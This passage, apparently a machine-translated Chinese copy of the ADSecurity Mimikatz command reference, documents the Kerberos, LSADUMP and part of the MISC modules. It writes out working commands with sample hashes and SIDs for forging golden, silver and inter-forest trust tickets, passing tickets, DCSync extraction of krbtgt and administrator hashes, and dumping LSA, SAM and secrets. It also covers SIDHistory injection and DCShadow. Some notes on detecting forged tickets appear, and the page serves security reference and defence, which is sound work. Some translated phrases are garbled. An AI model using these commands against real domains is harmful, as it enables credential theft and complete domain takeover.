-<li>/groups（可选） - 用户所属的组RID（第一个是主要组）。<br>添加用户或计算机帐户RID以接收相同的访问权限。<br>默认组：513,512,520,518,519，用于众所周知的管理员组（如下所列）。</li>
-<li>/krbtgt - 域KDC服务帐户（KRBTGT）的NTLM密码哈希。用于加密和签署TGT。</li>
-<li>/ticket（可选） - 提供保存Golden Ticket文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
-<li>/ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。</li>
-<li>/id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。</li>
-<li>/startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。</li>
-<li>/endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</li>
-<li>/renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</li>
-<li>/sids（可选） - 设置为AD林中Enterprise Admins组的SID（[ADRootDomainSID] -519），以欺骗整个AD林中的企业管理员权限（AD林中每个域中的AD管理员）。</li>
-<li>/aes128 - AES128密钥</li>
-<li>/aes256 - AES256密钥</li>
-</ul>
-<p>金票默认组：</p>
-<ul>
-<li>域用户SID：S-1-5-21 <domainid> -513</domainid></li>
-<li>域管理员SID：S-1-5-21 <domainid> -512</domainid></li>
-<li>架构管理员SID：S-1-5-21 <domainid> -518</domainid></li>
-<li>企业管理员SID：S-1-5-21 <domainid> -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数）</domainid></li>
-<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
-</ul>
-<p>kerberos::golden / admin：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</p>
-<p>命令示例：<br><em>。\ mimikatz“kerberos::golden / admin：DarthVader /domain:rd.lab.adsecurity.org / id：9999 / sid：S-1-5-21-135380161-102191138-581311202 / krbtgt：13026055d01f235d67634e109da03321 / startoffset：0 / endin：600 / renewmax：10080 / ptt“退出</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png" alt="Mimikatz-CreateGoldenTicket-DarthVader2"></a></p>
-<p>金票参考：</p>
-<p>* <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">黄金门票现在更加黄金（有SID历史）</a></p>
-<p><strong>2016</strong><br>年1月初更新<strong>：</strong> 2015年1月初，我与客户分享了检测伪造Kerberos门票的指标，随后在2015年的BSides Charm上提供了此信息。不久之后，Mimikatz更新了一个设置为静态值的域字段，通常包含字符串“eo.oe”。截至<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">2016年1月5</a>日的<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz更新</a>，伪造的Kerberos票证不再包含域异常，因为<a href="https://github.com/gentilkiwi/mimikatz/commit/fbb32cdcfa688892ab91b98044c453414193bb74#diff-60c3d6f46631121e0d6f97c2a2e143c9R602" target="_blank" rel="noopener">netbios域名放置在Kerberos票证的域组件中</a>。</p>
-<p>Mimikatz代码差异：<br><a href="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" alt="GT-DomainFieldUpdate-20150105"></a></p>
-<p>上的困难的详细信息在所述检测伪造的Kerberos票证（金券，银门票等）在<a href="https://adsecurity.org/?p=1515#DetectingForgedKerberosTickets" target="_blank" rel="noopener">检测锻造Kerberos票证部</a>。</p>
-<h4 id="Silver-Ticket-银色票"><a href="#Silver-Ticket-银色票" class="headerlink" title="Silver Ticket 银色票"></a><strong>Silver Ticket 银色票</strong></h4><p>Silver Ticket是使用目标服务帐户（由SPN映射标识）NTLM密码哈希来加密和签名的TGS（类似于TGT格式）。</p>
-<p>创造银票的Mimikatz命令是“kerberos::golden”（是的，你运行’golden’来创建银票）。</p>
-<p>Mimikatz Silver Ticket Command参考：</p>
-<ul>
-<li><strong>/</strong>domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。</li>
-<li>/sid - 域的SID。在此示例中：“S-1-5-21-1473643419-774954089-2222329127”。</li>
-<li>/sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的Enterprise Admins组。Ť <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">他的参数将提供的小岛屿发展中国家的SID历史参数。</a></li>
-<li>/user - 模拟用户名</li>
-<li>/ groups（可选） - 用户所属的组RID（第一个是主要组）<br>默认值：513,512,520,518,519，用于众所周知的管理员组（如下所列）。</li>
-<li>/ticket（可选） - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
-<li>/ ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。</li>
-<li>/id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。</li>
-<li>/ startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。</li>
-<li>/ endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</li>
-<li>/renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</li>
-<li>/ aes128 - AES128密钥</li>
-<li>/ aes256 - AES256密钥</li>
-</ul>
-<p>Silver Ticket必需参数：</p>
-<ul>
-<li>/target - 目标服务器的FQDN。</li>
-<li>/service - 目标服务器上运行的kerberos服务。这是服务主体名称类（或类型），如cifs，http，mssql。</li>
-<li>/rc4 - 服务的NTLM哈希值（计算机帐户或用户帐户）</li>
-</ul>
-<p>银票默认组：</p>
-<ul>
-<li>域用户SID：S-1-5-21 <domainid> -513</domainid></li>
-<li>域管理员SID：S-1-5-21 <domainid> -512</domainid></li>
-<li>架构管理员SID：S-1-5-21 <domainid> -518</domainid></li>
-<li>企业管理员SID：S-1-5-21 <domainid> -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数）</domainid></li>
-<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
-</ul>
-<p>示例Mimikatz命令创建银票：</p>
-<p>以下Mimikatz命令在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建Silver Ticket。为了成功创建此Silver Ticket，需要通过AD域转储或在本地系统上运行Mimikatz来发现adsmswin2k8r2.lab.adsecurity.org的AD计算机帐户密码哈希，如上所示（<em>Mimikatz“ privilege::debug“”sekurlsa::logonpasswords“退出</em>）。NTLM密码哈希与/ rc4参数一起使用。还需要在/ service参数中标识服务SPN类型。最后，需要在/ target参数中提供目标计算机的完全限定域名。不要忘记/ sid参数中的域SID。</p>
-<p><em>mimikatz“kerberos::golden / admin：LukeSkywalker / id：1106 /domain:lab.adsecurity.org / sid：S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org / rc4 ：d7e2b80507ea074ad59f152a1ba20458 / service：cifs / ptt“退出</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png" alt="SilverTicketUsage-MemberServer，CIFS，AdminShare2"></a></p>
-<h5 id="信托票"><a href="#信托票" class="headerlink" title="信托票"></a>信托票</h5><p>确定Active Directory信任密码哈希后（<a href="https://adsecurity.org/?page_id=1821#LSADUMP" target="_blank" rel="noopener">Mimikatz“privilege::debug”“lsadump::trust / patch”退出</a>），可以生成信任票证。<a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">关于信任票的更多背景信息。</a></p>
-<p>伪造内部AD森林信托票</p>
-<p>在这个例子中，Trust门票利用Benjamin Delpy写的两个额外工具，叫做AskTGS和Kirbikator。</p>
-<p><strong>第1步：转储信任密码（信任密钥）</strong></p>
-<p>目前的Mimikatz版本可以提取信任密钥（密码）。<br>*  <a href="https://adsecurity.org/?page_id=1821#LSADUMP" target="_blank" rel="noopener">Mimikatz“privilege::debug”“lsadump::trust / patch”退出</a></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg" alt="TrustTicket-V2-Mimikatz-DumpTrustKeys"></a></p>
-<p><strong>步骤2：使用Mimikatz创建伪造的信任票证（inter-realm TGT）</strong></p>
-<p>伪造信托票，说明票务持有人是AD森林中的企业管理员（利用SIDHistory，“sids”，跨Mimikatz的信托，我对Mimikatz的“贡献”）。这样可以实现从子域到父域的完全管理访问。请注意，此帐户不必存在于任何地方，因为它实际上是信任的金票。</p>
-<p>创建信托票的Mimikatz命令是“kerberos::golden”</p>
-<ul>
-<li>/domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。</li>
-<li>/sid - 域的SID。在这个例子中：“S-1-5-21-3677078698-724690114-1972670770”。</li>
-<li>/ sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1581655573-3923512380-696647894-519”的Enterprise Admins组。Ť <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">他的参数将提供的小岛屿发展中国家的SID历史参数。</a></li>
-<li>/user - 模拟用户名</li>
-<li>/ groups（可选） - 用户所属的组RID（第一个是主要组）<br>默认值：513,512,520,518,519，用于众所周知的管理员组（如下所列）。</li>
-<li>/ticket（可选） - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
-<li>/ ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。</li>
-<li>/id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。</li>
-<li>/ startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。</li>
-<li>/ endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</li>
-<li>/renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</li>
-<li>/ aes128 - AES128密钥</li>
-<li>/ aes256 - AES256密钥</li>
-</ul>
-<p>Trust Ticket特定的必需参数：</p>
-<ul>
-<li>/target - 目标域的FQDN。</li>
-<li>/service - 在目标域（krbtgt）中运行的kerberos服务。</li>
-<li>/rc4 - 服务kerberos服务帐户（krbtgt）的NTLM哈希。</li>
-<li>/ticket - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
-</ul>
-<p>信任票默认组：</p>
-<ul>
-<li>域用户SID：S-1-5-21 <domainid> -513</domainid></li>
-<li>域管理员SID：S-1-5-21 <domainid> -512</domainid></li>
-<li>架构管理员SID：S-1-5-21 <domainid> -518</domainid></li>
-<li>企业管理员SID：S-1-5-21 <domainid> -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数）</domainid></li>
-<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
-</ul>
-<p><em>Mimikatz“Kerberos::golden /domain:child.lab.adsecurity.org / sid：S-1-5-21-3677078698-724690114-1972670770 **/ sids：S-1-5-21-1581655573-3923512380-696647894-519** / rc4：49ed1653275f78846ff06de1a02386fd / user：DarthVader / service：krbtgt /target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi“exit</em></p>
-<p>注意：使用/ sids参数将为目标AD域创建一个信任票证，表明持有者是企业管理员。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-Create-GoldenTrustTicket-ADSECLAB-DarthVader-wSIDHistory.jpg" alt="TrustTicket-V2-Mimikatz  - 创建 -  GoldenTrustTicket-ADSECLAB  - 达斯·维达，wSIDHistory"></a></p>
-<p>注意：<a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">Mimikatz生成带有硬编码域值的Silver Tickets，可能会出现在某些事件中。与有效的Kerberos身份验证相比，与伪造的故障单相关的登录/注销事件中的域字段也可能存在异常。</a></p>
-<p><strong>步骤3：使用在步骤2中创建的Trust Ticket文件获取目标域中目标服务的TGS。将TGS保存到文件中。</strong></p>
-<p>生成的TGS通过在此示例中针对CIFS服务提供对父（根）域的域控制器的EA访问（但它可以针对任何目标）。</p>
-<p><em>Asktgs c：\ temp \ tickets \ EA-ADSECLABCHILD.kirbi CIFS / ADSDC02.lab.adsecurity.org</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-AskTGS-Get-CIFS-ADSDC02-with-EA-SIDHistory.jpg" alt="TrustTicket-V2-Kekeo-AskTGS-GET-CIFS-ADSDC02-与-EA-SID历史"></a></p>
-<p><strong>步骤4：注入在步骤3中创建的TGS文件，然后使用欺骗权限访问目标服务。</strong></p>
-<p><em>Kirbikator lsa c：\ temp \ tickets \ CIFS.ADSDC02.lab.adsecurity.org.kirbi</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Kekeo-Kibikator-Inject-CIFS-ADSDC02-with-EA-SIDHistory-ADSDC02-AdminShareAccess.jpg" alt="TrustTicket-V2-Kekeo-Kibikator-进样，CIFS，ADSDC02-与-EA-SID历史-ADSDC02-AdminShareAccess"></a></p>
-<p><strong>KERBEROS::Hash</strong> - 密钥的哈希密码</p>
-<p><strong>KERBEROS::List -</strong>列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。与“klist”的功能类似。</p>
-<ul>
-<li>/ export - 导出文件的用户票证。</li>
-</ul>
-<p>使用<a href="https://adsecurity.org/?page_id=1821#SEKURLSATickets" target="_blank" rel="noopener">SEKURLSA::TICKETS</a>为系统上所有经过身份验证的用户转储Kerberos票证。<br>请注意，在某些情况下，用户证书将不会导出。这需要运行SEKURLSA::Tickets / export（具有适当的权限）。<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" alt="Mimikatz-Kerberos的清除"></a></p>
-<p><strong>KERBEROS::PTC</strong> - 传递缓存（NT6）<br>* Nix系统，如Mac OS，Linux，BSD，Unix等缓存Kerberos凭据。可以使用Mimikatz复制和传递此缓存数据。对于在ccache文件中注入Kerberos票证也很有用。</p>
-<p>Mimikatz的kerberos::ptc的一个很好的例子就是<a href="https://adsecurity.org/?p=676" target="_blank" rel="noopener">利用PyKEK开发MS14-068</a>。PyKEK生成一个ccache文件，可以使用kerberos::ptc向Mimikatz注入。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-PTC-PyKEK-ccacheFile.jpg" alt="Mimikatz-PTC-PyKEK-ccacheFile"></a></p>
-<p><strong>KERBEROS::PTT</strong> - 传递票证<a href="https://adsecurity.org/?p=1667" target="_blank" rel="noopener">找到Kerberos</a>票证<br>后，可以将其复制到另一个系统并传递到当前会话，有效地模拟登录，而无需与域控制器进行任何通信。无需特殊权利。 与SEKURLSA::PTH（Pass-The-Hash）相似。</p>
-<ul>
-<li>/ filename - 票证的文件名（可以是多个）</li>
-<li>/ diretory - 一个目录路径，将注入所有.kirbi文件。</li>
-</ul>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2.png" alt="KerberosUnConstrainedDelegation-Mimikatz-PTT-LS-Ticket2"></a></p>
-<p><strong>KERBEROS::Purge</strong> - 清除所有Kerberos票证<br>类似于“klist purge”的功能。在传递票证（PTC，PTT等）之前运行此命令以确保使用正确的用户上下文。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Purge.png" alt="Mimikatz-Kerberos的清除"></a></p>
-<p><strong>KERBEROS::TGT</strong> - 为当前用户获取当前的TGT。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-TGT.png" alt="Mimikatz-Kerberos的TGT"></a></p>
-<h4 id="LSADUMP"><a href="#LSADUMP" class="headerlink" title="LSADUMP"></a><strong>LSADUMP</strong></h4><p>LSADUMP Mimikatz模块与Windows本地安全机构（LSA）交互以提取凭据。这些命令中的大多数都需要debug权限（privlege::debug）或本地系统。默认情况下，Administrators组具有“debug”权限。debug仍然必须通过运行“privilege::debug”来“激活”。</p>
-<p><strong>LSADUMP::Backupkeys</strong>需要管理员权限。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-BackupKeys.png" alt="Mimikatz-LSADump-BackupKeys"></a></p>
-<p><strong>LSADUMP::Cache</strong> - 获取SysKey解密NL $ KM然后MSCache（v2）（来自注册表或配置单元）<br>需要管理员权限。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Cache.png" alt="Mimikatz-LSADump-缓存"></a></p>
-<p><strong>LSADUMP::ChangeNTLM</strong>  - 要求服务器为一个用户设置新密码/ ntlm。</p>
-<p><strong>LSADUMP::DCShadow</strong> - 将复制更改推送到域控制器。在<a href="https://www.dcshadow.com/" target="_blank" rel="noopener"> DCShadow.com上</a>阅读更多<a href="https://www.dcshadow.com/" target="_blank" rel="noopener">内容</a>。<br>这需要完整的AD管理员权限或KRBTGT pw哈希。<br>DCShadow临时将计算机设置为“DC”以进行复制：</p>
-<ul>
-<li>在AD林配置分区中创建2个对象。</li>
-<li>更新用于包含“GC”（全局编录）和“E3514235-4B06-11D1-AB04-00C04FC2DCD2”（AD复制）的计算机的SPN。有关<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener">ADSecurity SPN部分</a>中的Kerberos服务主体名称的更多信息。</li>
-<li>通过DrsReplicaAdd和KCC将更新推送到DC。</li>
-<li>从配置分区中删除创建的对象。</li>
-</ul>
-<p><img src="https://adsecurity.org/wp-content/uploads/2018/02/DCShadow-init-01-1.jpg" alt="img"></p>
-<p><img src="https://adsecurity.org/wp-content/uploads/2018/02/DCShadow-Push.jpg" alt="img"></p>
-<p>配置分区中的临时DC对象<img src="https://adsecurity.org/wp-content/uploads/2018/02/DCShadow-ConfigurationContainerChange-01.jpg" alt="img"></p>
-<p><a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener"><strong>LSADUMP::DCSync</strong></a> - 要求DC同步对象（获取帐户的密码数据）<br><a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener">需要域管理员，域管理员或自定义委派的成员身份。</a></p>
-<p>2015年8月Mimkatz增加的一个主要功能是“DCSync”，它有效地“模仿”域控制器并从目标域控制器请求帐户密码数据。DCSync由Benjamin Delpy和Vincent Le Toux编写。从Mimikatz版本2.1 alpha 20160501开始，DCSync与重命名的域一起使用。</p>
-<p>DCSync之前的漏洞利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz以获取KRBTGT密码哈希以创建黄金票证。借助Mimikatz的DCSync和相应的权限，攻击者可以通过网络从域控制器提取密码哈希以及以前的密码哈希，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。</p>
-<p>运行DCSync需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都可以运行DCSync来提取密码数据。请注意，默认情况下，只允许只读域控制器为用户提取密码数据。</p>
-<p><strong>DCSync的工作原理：</strong></p>
-<ol>
-<li>在指定的域名中发现域控制器。</li>
-<li>请求域控制器通过<a href="https://msdn.microsoft.com/en-us/library/dd207691.aspx" target="_blank" rel="noopener">GetNCChanges</a>复制用户凭据（利用<a href="https://msdn.microsoft.com/en-us/library/cc228086.aspx" target="_blank" rel="noopener">目录复制服务（DRS）远程协议</a>）</li>
-</ol>
-<p>我之前已经为<a href="http://blogs.metcorpconsulting.com/tech/?p=923" target="_blank" rel="noopener">域控制器复制</a>完成了一些数据包捕获，并确定了域控制器如何复制的DC内部通信流程。</p>
-<p>Samba Wiki描述了<a href="https://wiki.samba.org/index.php/DRSUAPI" target="_blank" rel="noopener">DSGetNCChanges函数</a>：</p>
-<p><em>“当第一个想要从第二个获取AD对象更新时，客户端DC向服务器发送DSGetNCChanges请求。响应包含客户端必须应用于其NC副本的一组更新。… 当DC收到DSReplicaSync请求时，对于它复制的每个DC（存储在RepsFrom数据结构中），它执行复制周期，其行为类似于客户端，并向该DC发出DSGetNCChanges请求。因此它从它复制的每个DC中获取最新的AD对象。“</em></p>
-<p><strong>DCSync选项：</strong></p>
-<ul>
-<li>/ all - DCSync为整个域提取数据。</li>
-<li>/ user - 要为其提取数据的用户的用户ID或SID。</li>
-<li>/ domain（可选） - Active Directory域的FQDN。Mimikatz将发现域中的DC以进行连接。如果未提供此参数，则Mimikatz默认为当前域。</li>
-<li>/ csv - 导出到csv</li>
-<li>/ dc（可选） - 指定您希望DCSync连接到的域控制器并收集数据。</li>
-</ul>
-<p>还有一个/ guid参数。</p>
-<p><strong>DCSync命令示例：</strong></p>
-<p>在rd.adsecurity.org域中<em>提取</em> KRBTGT用户帐户的密码数据：<br><em>Mimikatz“lsadump::dcsync /domain:rd.adsecurity.org / user：krbtgt”退出</em></p>
-<p>在rd.adsecurity.org域中<em>提取</em>管理员用户帐户的密码数据：<br><em>Mimikatz“lsadump::dcsync /domain:rd.adsecurity.org/user：Administrator”退出</em></p>
-<p>在lab.adsecurity.org域中提取ADSDC03域控制器计算机帐户的密码数据：<br><em>Mimikatz“lsadump::dcsync /domain:lab.adsecurity.org / user：adsdc03 $”退出</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-DCSync.jpg" alt="Mimikatz-LSADump-DCSync"></a></p>
-<p><strong>LSADUMP::LSA</strong> - 要求LSA Server检索SAM / AD企业（正常，动态补丁或注入）。使用/ patch作为数据子集，使用/ inject来处理所有事情。<em>需要系统或debug权限。</em></p>
-<ul>
-<li>/ inject - 注入LSASS以提取凭据</li>
-<li>/ name - 目标用户帐户的帐户名称</li>
-<li>/ id - 目标用户帐户的RID</li>
-<li>/ patch - 补丁LSASS。</li>
-</ul>
-<p>通常，服务帐户是Domain Admins（或等效的）的成员，或者Domain Admin最近登录到计算机，攻击者从中转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希。</p>
-<p>命令：mimikatz lsadump::lsa / inject exit</p>
-<p>在域控制器上运行时，转储Active Directory域中的凭据数据。<br>需要管理员访问权限（具有debug权限）或本地系统权限</p>
-<p>RID 502帐户是KRBTGT帐户，RID 500帐户是域的默认管理员。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-LSA.png" alt="Mimikatz-LSADump-LSA"></a></p>
-<p>这是运行LSADUMP::lsa / patch时的结果，它只转储NTLM密码哈希值。</p>
-<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/InvokeMimikatz-DumpADdb-KRBTGT3.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/InvokeMimikatz-DumpADdb-KRBTGT_thumb3.png" alt="InvokeMimikatz-DumpADdb-KRBTGT"></a></p>
-<p><strong>LSADUMP::NetSync</strong></p>
-<p>NetSync提供了一种使用DC计算机帐户密码数据通过Silver Ticket模拟域控制器和DCSync目标帐户信息（包括密码数据）的简单方法。</p>
-<p><strong>LSADUMP::RpData</strong></p>
-<p><strong>LSADUMP::SAM</strong> - 获取SysKey来解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。<br><em>需要系统或debug权限。</em><br>它包含用户密码的NTLM，有时还包含LM哈希。它可以在两种模式下工作：在线（使用SYSTEM用户或令牌）或离线（使用SYSTEM＆SAM配置单元或备份）。</p>
-<p>在针对在线SAM运行时，需要管理员访问权限（具有debug权限）或本地系统权限。</p>
-<p><em>获取模拟的SYSTEM令牌：Mimikatz“PRIVILEGE::Debug”“TOKEN::elevate”</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-SAM.png" alt="Mimikatz-LSADump-SAM"></a></p>
-<p><strong>LSADUMP::Secrets</strong> - 获取SysKey来解密SECRETS条目（来自注册表或配置单元）。<br><em>需要系统或debug权限。</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Secrets.png" alt="Mimikatz-LSADump-秘密"></a></p>
-<p><strong>LSADUMP::SetNTLM</strong>  - 要求服务器为一个用户设置一个新密码/ ntlm。</p>
-<p><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener"><strong>LSADUMP::Trust</strong></a> - 要求LSA Server检索Trust Auth信息（正常或动态补丁）。<br><em>需要系统或debug权限。</em></p>
-<p>从Active Directory中提取数据以获取域的现有信任关系。还显示信任密钥（密码）。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-LSADump-Trust.png" alt="Mimikatz-LSADump信托"></a></p>
-<h4 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h4><p>MISC Mimikatz模块对于那些不太适合其他地方的命令来说是一种全能。<br>这个模块中最着名的命令是MISC::AddSID，MISC::MemSSP和MISC::Skeleton。</p>
-<p><a href="https://adsecurity.org/?p=1772" target="_blank" rel="noopener"><strong>MISC::AddSid</strong></a> - 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。<br><em>需要系统或debug权限。</em></p>
-<p><em>注意：ADDSID已移至2.1版本分支中的SID模块。</em><br><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator1.png" alt="SneakyPersistence-AddSIDHistory-BobaFett-ADSADministrator"></a><a href="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett1.png" alt="SneakyPersistence-AddSIDHistory-GetUSerInfo-BobaFett"></a></p>
-<p><strong>MISC::Cmd</strong> - 命令提示符（没有DisableCMD）。<br><em>需要管理员权限。</em></p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Misc-CMD.png" alt="Mimikatz-MISC-CMD"></a></p>
-<p><strong>MISC::Compressme</strong> - 将Mimikatz文件压缩到一个名为“mimikatz_x64.compressed”的新文件</p>
